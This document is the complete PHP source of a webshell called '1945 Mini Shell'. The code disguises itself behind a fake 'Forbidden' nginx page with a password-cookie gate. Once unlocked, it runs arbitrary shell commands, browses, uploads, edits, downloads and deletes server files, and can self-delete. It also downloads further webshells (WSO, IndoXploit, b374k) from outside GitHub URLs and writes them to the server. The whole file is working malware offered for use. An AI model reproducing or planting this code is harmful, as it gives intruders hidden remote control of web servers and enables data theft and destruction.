<?php
/*
@ PHPWebshell - 1945 Mini Shell.
@ c0ded by : shutdown57
@ Contact : indonesianpeople.shutdown57@gmail.com
*/
error_reporting(0);
set_time_limit(0);
$passwordMiNi1945 = "1945mini";
$are=array("adminer"=>"https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php",
			"idx3"=>"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/indoxploit.php",
			"1945v2017"=>"https://raw.githubusercontent.com/alintamvanz/1945shell/master/ext/1945.php",
			"wso"=>"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/wso.php",
			"b374k"=>"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/b374k.php");
	if(isset($passwordMiNi1945)&&empty($_COOKIE[md5($_SERVER['HTTP_HOST'])]))
	{
		echo "<title>Forbidden</title><center><h1>Forbidden</h1><hr>Nginx 1.10.1</center>";
		if(isset($_GET['pass'])){
			if($_GET['pass']==$passwordMiNi1945){
				setcookie(md5($_SERVER['HTTP_HOST']),md5($passwordMiNi1945));
				echo "<meta http-equiv='refresh' content='0;url='>";
			}
		}
		exit();
	}
function getpath()
{
	if(isset($_GET['d']))
	{
		$d=$_GET['d'];
	}else{
		$d=getcwd();
	}
	return $d;
}
function cmd($cmd){ if(function_exists('system')) { @ob_start(); @system($cmd); $buff = @ob_get_contents();@ob_end_clean(); return $buff; 	} elseif(function_exists('exec')) { @exec($cmd,$results); $buff = ""; foreach($results as $result) { $buff .= $result; } return $buff; 	} elseif(function_exists('passthru')) { @ob_start(); @passthru($cmd); $buff = @ob_get_contents(); @ob_end_clean(); return $buff; 	} elseif(function_exists('shell_exec')) { $buff = @shell_exec($cmd); return $buff; }}
function delete($dir){if(is_dir($dir)){if(!rmdir($dir)){$s=scandir($dir);foreach ($s as $ss) {if(is_file($dir."/".$ss)){if(unlink($dir."/".$ss)){$rm=rmdir($dir);}}if(is_dir($dir."/".$ss)){$rm=rmdir($dir."/".$ss);$rm.=rmdir($dir);$rm.=system('rm -rf '.$dir);}}}}elseif(is_file($dir)){$rm = unlink($dir);if(!$rm){system('rm -rf '.$dir);}}return $rm;}
function getowner($path){if(function_exists('posix_getpwuid')) {$downer = @posix_getpwuid(fileowner($path));$downer = $downer['name'];} else {$downer = fileowner($path);}return $downer;}
function getgroup($path){if(function_exists('posix_getgrgid')) {$dgrp = @posix_getgrgid(filegroup($path));$dgrp = $dgrp['name'];} else { $dgrp = filegroup($path);}return $dgrp;}
function upload($a,$b){ if(function_exists('move_uploaded_file')){$upl = move_uploaded_file($a,$b);}elseif (function_exists('copy')) {  $upl = copy($a,$b);}return $upl; }function array_upload($file){ $file_ary = array(); $file_count = count($file['name']); $file_key = array_keys($file); for($i=0;$i<$file_count;$i++) { foreach($file_key as $val) { $file_ary[$i][$val] = $file[$val][$i]; } } return $file_ary;}
function sedirs($dir)
{
	if(function_exists('scandir'))
	{
		$s=scandir($dir);
		chdir($dir);
	}else{
		$s=system($dir);
	}
	return $s;
}
function getperms($files)
{
		if($s_m = @fileperms($files)){
		$s_p = 'u';
		if(($s_m & 0xC000) == 0xC000)$s_p = 's';
		elseif(($s_m & 0xA000) == 0xA000)$s_p = 'l';
		elseif(($s_m & 0x8000) == 0x8000)$s_p = '-';
		elseif(($s_m & 0x6000) == 0x6000)$s_p = 'b';
		elseif(($s_m & 0x4000) == 0x4000)$s_p = 'd';
		elseif(($s_m & 0x2000) == 0x2000)$s_p = 'c';
		elseif(($s_m & 0x1000) == 0x1000)$s_p = 'p';
		$s_p .= ($s_m & 00400)? 'r':'-';
		$s_p .= ($s_m & 00200)? 'w':'-';
		$s_p .= ($s_m & 00100)? 'x':'-';
		$s_p .= ($s_m & 00040)? 'r':'-';
		$s_p .= ($s_m & 00020)? 'w':'-';
		$s_p .= ($s_m & 00010)? 'x':'-';
		$s_p .= ($s_m & 00004)? 'r':'-';
		$s_p .= ($s_m & 00002)? 'w':'-';
		$s_p .= ($s_m & 00001)? 'x':'-';
		return $s_p;
	}
	else return "???????????";
}
function downloads($file)
{
	@ob_clean();
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($file).'"');
	header('Expires: 0');header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}
function viewfilefunc($file)
{
	echo "<center><h1> View : ".basename($file)."</h1>";
	echo "<textarea readonly>";
	echo htmlspecialchars(file_get_contents($file));
	echo "</textarea></center>";
}
function ts($s_s){
	if($s_s<=0) return 0;
	$s_w = array('B','KB','MB','GB','TB','PB','EB','ZB','YB');
	$s_e = floor(log($s_s)/log(1024));
	return sprintf('%.2f '.$s_w[$s_e], ($s_s/pow(1024, floor($s_e))));
}
function getsize($s_f){
	$s_s = @filesize($s_f);
	if($s_s !== false){
		if($s_s<=0) return 0;
		return ts($s_s);
	}
	else return "???";
}
function kuchiyose($a,$b)
{
	$fgc=file_get_contents($a);
	$fp=fopen($b.".1945m1n1.php",'w');
	fwrite($fp,$fgc);
	fclose($fp);
}
function cekk($f){
	if(file_exists($f.".1945m1n1.php")){
		echo "<b>Request done ! <a href='$f.1945m1n1.php' target='_blank'>Click here</a>";
	}
}
function renamefunc($dir,$oldname){
	echo "<center><h1>Rename : ".$oldname."</h1><br><form method='POST' class='in'>oldname : <input type='text' value='$oldname' class='in' readonly>";
	echo "Newname : <input type='text' name='newname' value='newname' class='in'><input type='submit' value='>>' name='s'></form></center>";
	if(isset($_POST['s'])){
		rename($dir."/".$oldname,$dir."/".$_POST['newname']);
		echo "<meta http-equiv='refresh' content='0;url=?d=".dirname($dir)."'>";
	}
}
function editfunc($dir,$file){
	echo "<center><h1> Edit : ".$file."</h1><br><form method='POST'>";
	echo "<textarea name='editfile'>".htmlspecialchars(file_get_contents($dir."/".$file))."</textarea><br>";
	echo "<input type='submit' name='sbmt' value='simpan !' style='width:200px;'>";
	echo "</form>";
	if(isset($_POST['sbmt']))
	{
		$fp=fopen($dir."/".$file,'w');
		fwrite($fp,$_POST['editfile']);
		fclose($fp);
		echo "<br><b>Tersimpan @".date('D ,d m Y')."</b><br>";
	}
}
function berinamafunc($dir){
	echo "<center><h1>New file </h1><br><form method='POST' class='in'>";
	echo "Filename : <input type='text' name='filename' value='newfile.php'>";
	echo "<input type='submit' name='svi' value='>>'>";
	echo "</form>";
	if(isset($_POST['svi']))
	{
		if(function_exists('touch')){
			touch($dir."/".$_POST['filename']);
		}else{
			$fp=fopen($dir."/".$_POST['filename'],'w');
			fwrite($fp,'#new file 1945');
			fclose($fp);
		}
		header('location:?d='.$dir.'&a=edit&f='.$_POST['filename']);
	}
}
function mkdirfunc($dir){
	echo "<center><h1>New directory</h1>";
	echo "<form method='POST' class='in'>New dir:<input type='text' name='mkdir'>";
	echo "<input type='submit' name='sbmt' value='>>'></form></center>";
	if(isset($_POST['sbmt']))
	{
		mkdir($dir."/".$_POST['mkdir']);
		echo "<meta http-equiv='refresh' content='0;url=?d=".$dir."'>";
	}

}
$gp=getpath();
?>
<!DOCTYPE html>
<html>
<head>
	<title>1945 Mini Shell</title>
<meta name="author" content="shutdown57">
<link rel="icon" type="text/css" href="https://raw.githubusercontent.com/alintamvanz/alintamvanz.github.io/master/images/favicon_1945.gif">
</head>
<style type="text/css">
	body{background:#333;color:#eee}
	.table{border: 1px solid #00e4ff;width:800px;border-collapse: collapse;}
	.table tr{border-bottom: 1px solid #fff}a{text-decoration: none;color:#eee;}a:hover{color: #00e4ff}.table tr:hover{background:#666}hr{border: 1px solid #00e4ff}.in{display: inline-block;}select,option,input,textarea{background:#333;color:#eee;border: 1px solid #00e4ff}textarea{width:700px;height: 500px;margin: 0 auto;}
</style>
<body>
<center>
<a href="?"><h1>1945 Mini Shell</h1></a>
</center>
<hr><div class="in">
<form class="in" method="get">Kuchiyose no jutsu : 
	<select name="a">
		<option value="">Kuchiyose</option>
		<option value="wso">WSO 2.5</option><option value="idx3">IndoXploit v3</option><option value="1945v2017">1945v2017</option><option value="b374k">b374k 2.8</option><option value="adminer">Adminer</option>
	</select><input type="submit" value=">>">
</form>
<form method="post" class="in" enctype="multipart/form-data" action="?d=<?php echo $gp;?>&a=upload"> Upload file :<input type="file" name="filup[]" multiple="" style="border: 0"><input type="submit" name="upload" value=">>"></form><form method="post" action="?d=<?php echo $gp;?>&a=cmd" class="in"> Command : <input type="text" name="cmd"><input type="submit" value=">>"></form>
<form method=get class="in">go to dir : <input type="text" name="d" value="<?php echo $gp;?>"><input type="submit" value=">>"></form><form method="get" class="in">Act? : <select name="a"><option value="logout">LogOut</option><option value="kill">Kill Self</option><option value="shell">Shell</option></select><input type="submit" value=">>"></form>
</div>
<hr>
<?php
if(empty($_GET['a']))
{
	?>
<table align="center" class="table">
	<th>Files</th><th>Size</th><th>owner:group</th><th>Permission</th><th>Action</th>
<?php
$dir=sedirs(getpath());
echo "<tr><td><a href=\"?d=".dirname($gp)."\">Current dir</a></td><td>--</td><td>--</td><td>--</td><td align=right><a href='?d=$gp&a=touch'>Newfile</a> | <a href='?d=$gp&a=mkdir'>newdir</a></td></tr>";
foreach($dir as $d1)
{if(!is_dir("$gp/$d1")||$d1=="."||$d1=="..")continue;
	?>
	<tr><td>[<a href="?d=<?php echo "$gp/$d1"?>"><?php echo $d1;?></a>]</td>
	<td><?php echo getsize("$gp/$d1");?></td>
	<td><?php echo getowner("$gp/$f1");?>:<?php echo getgroup("$gp/$f1");?></td>
	<td><?php echo getperms("$gp/$d1");?></td>
	<td align="right"><a href="?d=<?php echo "$gp/$d1"?>&a=rename">rename</a> | <a href="?d=<?php echo "$gp/$d1"?>&a=delete">delete</a></td>
	</tr>
	<?php
}
foreach($dir as $f1)
{
	if(!is_file("$gp/$f1")||$f1=="."||$f1=="..")continue;
?>
	<tr><td><a href="?d=<?php echo $gp;?>&a=view&f=<?php echo $f1;?>"><?php echo $f1;?></a></td>
	<td><?php echo getsize("$gp/$f1");?></td>
	<td><?php echo getowner("$gp/$f1");?>:<?php echo getgroup("$gp/$f1");?></td>
	<td><?php echo getperms("$gp/$f1");?></td>
	<td align="right">
	<a href="?d=<?php echo $gp;?>&a=rename&f=<?php echo $f1;?>">rename</a> |
	<a href="?d=<?php echo "$gp/$f1";?>&a=delete">delete</a> |
	<a href="?d=<?php echo $gp;?>&a=edit&f=<?php echo $f1;?>">edit</a> |
	<a href="?d=<?php echo $gp;?>&a=download&f=<?php echo $f1;?>">download</a></td>
	</tr>
	<?php
}
?>
</table>
<?php
}else{
@$a=$_GET['a'];
@$f=$_GET['f'];
@$d=$_GET['d'];
if($a=="view")
{viewfilefunc($d."/".$f);}elseif($a=="download"){downloads($d."/".$f);}
elseif($a=="logout"){if(setcookie(md5($_SERVER['HTTP_HOST']),""))
	echo "<script>alert('See You Next time !');window.location.href='????'</script>";}
elseif($a=="cmd"){
	echo "<center><h1> Command</h1></center>";
	?><form method="post" action="?d=<?php echo $gp;?>&a=cmd" class="in"> Command : <input type="text" name="cmd"><input type="submit" value=">>"></form><?php
	echo "<pre>".cmd($_POST['cmd'])."</pre>";
}
elseif($a=="rename"){$ff=(isset($_GET['f']) ? $_GET['f'] : basename($_GET['d']));$gdd=(isset($_GET['f'])) ? $_GET['d'] : dirname($_GET['d']); renamefunc($gdd,$ff);}
elseif($a=="delete"){delete($_GET['d']);echo "<meta http-equiv='refresh' content='0;url=?d=".dirname($_GET['d'])."'>";}
elseif($a=="upload"){
	$fil=array_upload($_FILES['filup']); foreach($fil as $filup)
	{
		$filoc=$d."/".$filup['name'];
		if(upload($filup['tmp_name'],$filoc))
		{
			echo "<font color=lime>Successfully upload -> <a href='?d=".$d."&a=view&f=".$filup['name']."'>".$filoc."</a></font><br>";
		}else{
			echo "<font color=red>Failed upload -> ".$filoc."</font><br>";
		}
	}
}
elseif($a=="mkdir"){mkdirfunc($d);}
elseif($a=="touch"){berinamafunc($d);}
elseif($a=="edit"){editfunc($_GET['d'],$_GET['f']);}
elseif($a=="idx3"){kuchiyose($are['idx3'],"indoxploit");cekk("indoxploit");}
elseif($a=="wso"){kuchiyose($are['wso'],"wso");cekk("wso");}
elseif($a=="1945v2017"){kuchiyose($are['1945v2017'],"1945");cekk("1945");}
elseif($a=="adminer"){kuchiyose($are['adminer'],"adminer");cekk("adminer");}
elseif($a=="b374k"){kuchiyose($are['b374k'],"b374k");cekk("b374k");}
}
?>
<footer style="bottom: 0;position: fixed;right: 0">copyright &copy; 2017 - Mini Shell by : shutdown57</footer>
</body>
</html>
